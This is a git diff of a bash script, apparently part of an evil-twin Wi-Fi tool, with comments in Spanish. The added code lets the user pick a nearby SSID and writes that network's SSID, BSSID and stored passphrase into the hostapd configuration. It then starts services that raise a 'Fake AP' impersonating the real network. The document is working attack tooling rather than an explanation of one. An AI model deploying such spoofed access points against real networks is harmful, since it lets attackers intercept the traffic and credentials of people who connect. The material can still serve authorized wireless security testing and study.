@@ -11,6 +11,7 @@ fi
 
 redes_disponibles=$(python3 extract_info.py)
 interfaz=$1
+hostapd_conf_file="/etc/hostapd/hostapd.conf"
 
 separador="---------------------------\n"
 
@@ -87,11 +88,39 @@ echo -e $separador
 
 read -p "Choose SSID to spoof: " SSID_elegido
 
-ssids_comas=$(IFS=,; echo "${SSIDs[*]}")
+N_SSID_elegido=-1
 
-if [[ ! ",${ssids_comas[@]}," =~ ",${SSID_elegido}," ]]; then
-    echo "SSID not found"
+for i in "${!SSIDs[@]}"; do
+    if [[ "${SSIDs[$i]}" == "$SSID_elegido" ]]; then
+        N_SSID_elegido=$i
+        break
+    fi
+done
+
+if [ $N_SSID_elegido -eq -1 ]
+then
+    echo "SSID not available"
     exit
 fi
 
-echo "Fake AP created and runnning"
+#Configuracion de hostapd
+cp "hostapd_conf.txt" "$hostapd_conf_file"
+
+sed -i "s/^interface=XXXXXX/interface=$1/" "$hostapd_conf_file"
+sed -i "s/^ssid=XXXXXX/ssid=${SSIDs[$N_SSID_elegido]}/" "$hostapd_conf_file"
+sed -i "s/^wpa_passphrase=XXXXXX/wpa_passphrase=${PSKs[$N_SSID_elegido]}/" "$hostapd_conf_file"
+sed -i "s/^bssid=XXXXXX/bssid=${BSSIDs[$N_SSID_elegido]}/" "$hostapd_conf_file"
+
+#Levantamiento del AP
+bash start_services.bash $1 $2
+
+echo "Fake AP created and runnning."
+
+read -p "Press any key to stop the AP and revert changes."
+
+bash stop_services.bash
+
+echo "Process finished."
+
+## FIN ##
+
